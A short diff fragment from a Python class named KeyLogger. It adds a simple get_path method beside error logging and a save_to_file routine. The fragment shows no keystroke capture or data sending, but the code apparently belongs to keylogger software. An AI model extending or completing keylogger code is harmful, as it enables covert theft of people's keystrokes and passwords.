@@ -37,6 +37,10 @@ class KeyLogger:
         except Exception as e:
             self.log += f" [Error: {e}] "
 
+    def get_path(self):
+        return self.path
+
+
     def save_to_file(self):
         if self.log.strip():
             try:
